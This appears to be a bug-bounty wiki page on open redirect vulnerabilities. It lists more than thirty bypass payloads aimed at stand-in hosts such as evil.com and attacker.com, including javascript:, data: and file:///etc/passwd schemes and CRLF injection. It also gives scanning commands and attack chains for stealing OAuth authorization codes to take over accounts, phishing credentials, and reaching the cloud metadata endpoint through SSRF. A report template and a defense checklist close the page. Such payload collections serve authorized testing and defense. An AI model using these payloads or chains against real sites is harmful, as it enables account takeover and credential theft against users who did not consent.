---
type: wiki
category: attack
tool: openredirex,burp,manual
status: active
last-updated: 2026-04-21
---

# Open Redirect: 30+ Bypasses + Attack Chains (2026 Edition)

> **Purpose:** Open redirect on its own is often marked N/A / P5, but when chained into OAuth redirect_uri theft / phishing / SSRF / XSS it becomes P1-P2. This document lists all the bypasses in full and shows how to chain them to raise severity.

## 0. 2026 Landscape

| Scenario | Bounty |
|------|--------|
| Open redirect alone (no phishing context) | P5 / N/A |
| Open redirect → OAuth authorization code leak | P2-P1 |
| Open redirect on login → credential phishing | P3-P2 |
| Open redirect → XSS (javascript: scheme) | P3 |
| Header-based redirect → cache poisoning | P3 |

Key point: **don't submit an open redirect on its own unless the scope explicitly accepts it**.

## 1. Finding a Redirect Sink

### 1.1 Parameter name list

```
redirect   redirect_uri   redirectUrl   return   returnUrl   returnTo
next       forward        callback      url       u   target
goto       dest           destination   continue
success_url   failure_url   back   r   link
```

### 1.2 Flow clues

```
Post-login redirect: ?next=/dashboard
Logout: ?return=/
OAuth: ?redirect_uri=...
Password reset: domain in the email link
Email confirmation: link landing page
Form POST → 302 Location
```

## 2. 30+ Bypass Techniques

### 2.1 Basic (no defense)

```
?url=https://evil.com/
?url=//evil.com/          # protocol-relative
?url=\\evil.com/          # backslash (browsers treat as /)
```

### 2.2 Whitelist "must be the target domain"

```
?url=https://evil.com@target.com/          # everything before @ is userinfo
?url=https://target.com.evil.com/          # subdomain confusion
?url=https://target.com@evil.com/          # reversed
?url=https://evil.com/?target.com          # target.com as a query
?url=https://evil.com/target.com           # target.com as a path
?url=https://evil.com#target.com           # after the #
?url=https://target.com.evil.com@evil.com/ # multi-layer
```

### 2.3 Whitelist "must start with https://target.com"

```
?url=https://target.com.evil.com/          # prefix matches
?url=https:target.com@evil.com/            # note the omitted //
?url=https://target.com%00.evil.com/       # null byte
?url=https://target.com%0d.evil.com/       # CR
?url=https://target.com%2eevil.com/        # encoded .
?url=https://target.com%09.evil.com/       # tab
```

### 2.4 Whitelist "must contain target.com"

```
?url=https://evil.com/.target.com
?url=https://evil.com#target.com
?url=https://evil.com?.target.com
?url=http://evil.com/?.target.com=
```

### 2.5 Scheme bypass

```
?url=javascript:alert(1)
?url=javascript://target.com/%0aalert(1)  # same-scheme trick to bypass a scheme check
?url=data:text/html,<script>...</script>
?url=vbscript:msgbox(1)                    # IE legacy
?url=file:///etc/passwd                    # some native apps
```

### 2.6 Encoding

```
?url=https://evil.com%2F@target.com        # / → %2F
?url=https%3A%2F%2Fevil.com                # fully encoded
?url=https%253A%252F%252Fevil.com          # double encoded
?url=https://%65vil.com                    # %65 = e
```

### 2.7 IDN / Unicode homographs

```
?url=https://ẹxample.com/                  # e look-alike with a dot below
?url=https://раураl.com/                    # Cyrillic p that visually resembles Latin p
# In 2026 most browsers render punycode, but email clients don't always
```

### 2.8 Protocol confusion

```
?url=//evil.com/                # inherits the current scheme
?url=\/\/evil.com/              # browser decodes to //
?url=/\/evil.com/               # same as above
?url=//%0A/evil.com/            # CR + //
```

### 2.9 Fragment tricks

```
?url=https://target.com#@evil.com/
?url=https://target.com#.evil.com/
# Some server-side regexes only check the part before the #, but browsers follow the full URL
```

### 2.10 Combined with CRLF injection

```
?url=/%0d%0aLocation:%20https://evil.com
# See [70-host-header-crlf.md] for details
```

### 2.11 Reverse-proxy parser differences

```
?url=https://target.com
       .evil.com/    # has a line break (trailing ...)
# Some parsers only read the first line
```

## 3. URL Parser Inconsistency Experiments

Browser vs. server URL parsers often disagree. Referencing Orange Tsai's [A New Era of SSRF] research:

```
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
   ↑
Python urllib: host=2.2.2.2
Go net/url:    host=1.1.1.1
Java:          host=1.1.1.1
libcurl:       host=3.3.3.3

→ The WAF parses this as 2.2.2.2 (whitelisted), but the backend fetches 3.3.3.3 (attacker-controlled)
```

Test against multiple parsers: [https://polyglot-xss.com/](this kind of differential test) or refer to published research PoCs.

## 4. Attack Chains

### 4.1 OAuth code theft (high bounty)

```
# Normal flow
https://provider.com/oauth?client=x&redirect_uri=https://target.com/callback

# Attack (if target.com has an open redirect)
1. Modify redirect_uri=https://target.com/redirect?url=https://evil.com
2. User authorizes → provider 302s to target.com/redirect?url=https://evil.com
3. target.com then 302s to evil.com?code=AUTHCODE
4. Attacker gets the code → exchanges it for an access_token → ATO

# Or the OAuth redirect_uri check itself does a substring check that can be bypassed
redirect_uri=https://target.com.evil.com/   # bypasses a startswith("target.com") check
```

See [16-oauth-attack-chains.md](16-oauth-attack-chains.md) for details.

### 4.2 Login credential phishing

```
https://target.com/login?return=/admin
→ Redirects to /admin after login

# Attack
https://target.com/login?return=https://target-login.evil.com/
→ User's login attempt fails (session reset) → Attacker's site shows "Session expired, log in again"
→ Victim enters their password on the attacker's page
```

### 4.3 CORS / CSP bypass

If the app's reflective CORS only trusts target.com, an open redirect to evil.com lets evil.com — via an attacker-controlled page — call the API and appear "same-origin" from the victim's perspective.

### 4.4 Mini SSRF

If the server follows redirects:

```
?url=https://attacker.com/
attacker.com 302s → http://169.254.169.254/
→ server follows it → SSRF to the IMDS
```

See [66-ssrf-deep.md](66-ssrf-deep.md) §3.1 for details.

### 4.5 XSS via javascript:

```
?url=javascript:alert(1)
# If the redirect uses window.location.href = input → JS executes directly
```

### 4.6 Cache poisoning → persistent redirect

Reflected redirect + unkeyed header → the next user gets redirected too.

See [64-cache-poisoning.md](64-cache-poisoning.md).

## 5. Detection

### 5.1 Manual

```bash
# Stuff evil.com into redirect-like parameters
for p in redirect redirect_uri returnUrl next url callback; do
  curl -Iks "https://target.com/?$p=https://evil.com" | grep -i location
done
```

### 5.2 ffuf

```bash
ffuf -u 'https://target.com/?redirect=FUZZ' \
  -w open-redirect-payloads.txt \
  -mr "Location:.*evil\.com"
```

### 5.3 OpenRedireX

```bash
git clone https://github.com/devanshbatham/OpenRedireX
cat urls.txt | python3 openredirex.py -p /path/to/payloads.txt
```

### 5.4 Gau + gf + ffuf chain

```bash
gau https://target.com | gf redirect | \
  ffuf -u '{URL}' -w payloads.txt -mr 'Location:'
```

### 5.5 Nuclei

```bash
nuclei -u https://target.com -tags redirect
```

## 6. Full PoC: OAuth state + redirect_uri Bypass → ATO

### Step 1: Find the OAuth provider

```
target.com uses Google Sign-In
https://accounts.google.com/o/oauth2/auth?
  client_id=APP_ID&
  redirect_uri=https://target.com/auth/google/callback&
  response_type=code&state=xxx
```

### Step 2: Test how redirect_uri is validated

```bash
# Try a subdomain
https://target.com.attacker.com/
https://target.com@attacker.com/
https://target.com/%2e%2e/.attacker.com
```

### Step 3: If the app has a path-based open redirect

```
target.com's /redirect?url= has an open redirect
→ redirect_uri=https://target.com/redirect?url=https://attacker.com
→ Google trusts the target.com prefix
→ after the user authorizes, the code is carried to attacker.com
```

### Step 4: Grab the code → exchange for a token → land in the victim's account

### Step 5: Report

```markdown
## Vulnerability Summary
https://target.com/redirect?url= does not whitelist the url parameter, allowing
redirects to any domain. Combined with the OAuth `redirect_uri` validation using
a startswith check, an attacker can craft
`redirect_uri=https://target.com/redirect?url=https://attacker.com`, bypassing
validation so the OAuth authorization code is sent to the attacker's server,
achieving full account takeover.

## PoC
[OAuth authorize URL + attacker captures the code + token exchange]

## Impact
- Account takeover for any user who signs in via Google (attacker obtains the access_token)
- Does not require the victim's credentials

## Severity
P1 / Critical

## Remediation
1. Whitelist the url parameter on the /redirect endpoint (same domain only)
2. Change OAuth redirect_uri validation to an exact match (not startswith / contains)
3. If dynamic redirect_uri is required, validate against a full whitelist array
```

## 7. Defense Checklist

```
1. Redirect destination whitelist must use exact match (not startswith / contains)
2. If dynamic redirection is required, use an ID map: {1:'/home',2:'/admin'}, users only pass the ID
3. Disallow javascript: / data: / file: schemes
4. Unify URL parsing (server and WAF should use the same library)
5. Use the framework's built-in safe redirect API (Django's `redirect()` checks automatically, Rails' `redirect_to`)
6. OAuth redirect_uri must use strict exact match + a registered list
7. Show an interstitial "You are leaving target.com" page (UX defense against phishing)
8. Avoid 302s; use meta refresh + a locked-down CSP
```

## Related Documents

- [16-oauth-attack-chains.md](16-oauth-attack-chains.md) — 12 full OAuth redirect_uri bypass techniques
- [64-cache-poisoning.md](64-cache-poisoning.md) — Redirect paired with caching
- [66-ssrf-deep.md](66-ssrf-deep.md) — URL parser differences + SSRF
- [70-host-header-crlf.md](70-host-header-crlf.md) — CRLF + Location
- PortSwigger DOM-based open redirection: https://portswigger.net/web-security/dom-based/open-redirection
- PayloadsAllTheThings Open Redirect: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
- OpenRedireX: https://github.com/devanshbatham/OpenRedireX
